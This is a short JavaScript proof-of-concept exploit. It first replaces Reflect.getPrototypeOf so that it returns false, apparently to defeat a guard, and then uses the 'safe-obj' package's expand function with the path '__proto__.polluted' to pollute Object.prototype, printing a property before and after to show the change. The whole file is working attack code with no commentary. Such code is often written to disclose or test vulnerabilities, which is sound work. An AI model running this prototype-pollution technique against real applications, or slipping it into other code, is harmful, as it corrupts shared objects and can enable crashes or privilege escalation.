Reflect.getPrototypeOf = () => false;
var safeObj = require('safe-obj');
obj = {};
console.log({}.polluted);
safeObj.expand(obj, '__proto__.polluted', 'yes');
console.log({}.polluted);